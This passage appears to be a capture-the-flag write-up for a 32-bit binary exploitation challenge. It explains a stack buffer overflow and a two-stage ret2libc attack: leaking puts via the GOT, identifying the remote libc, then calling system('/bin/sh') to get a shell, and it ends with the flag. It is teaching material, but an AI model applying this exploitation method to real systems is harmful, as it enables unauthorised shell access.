```

We can see there's a buffer overflow here due to it reading in at most 200 bytes to the stack buffer that can only hold up 54 bytes

At this point i just left trying to figure our what the program does and went on with exploitation

First we need a libc leak and to do that I did a ret2libc attack

You can check [here](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc) for more understanding i suppose

But the idea is that we'd first get a libc leak by doing:
- puts(got@puts)

Recall that the GOT points to the resolved function address in libc hence doing that would give us a libc leak for that function

And we weed to return back to main to do the second stage exploit which effectively does this:
- system('/bin/sh')

One issue would be that the libc for your current host isn't the same as the remote one thus it was needed to get the remote libc file 

To do that i made use of [this](https://libc.rip/) which basically would use the leak gotten to give possible values for the libc being used and this works because the last 3 nibbles for all libcs are always the same

I found mine to be `libc6-i386_2.39-0ubuntu8.3_amd64.so`

With that i could exploit the remote instance
![image](https://github.com/user-attachments/assets/becb957d-f6cc-48a8-a1a1-1c6cc1d86a1d)

The flag references ret2dlresolve hmmm 

Definitely didn't use that

In any case we have the flag

```
Flag: battleCTF{ret2CLI@dlresolve_a22c24101f31bb15ea7ac818364c980c3fd8ab0a9ed99f023a5c6910a30ee52d}
```


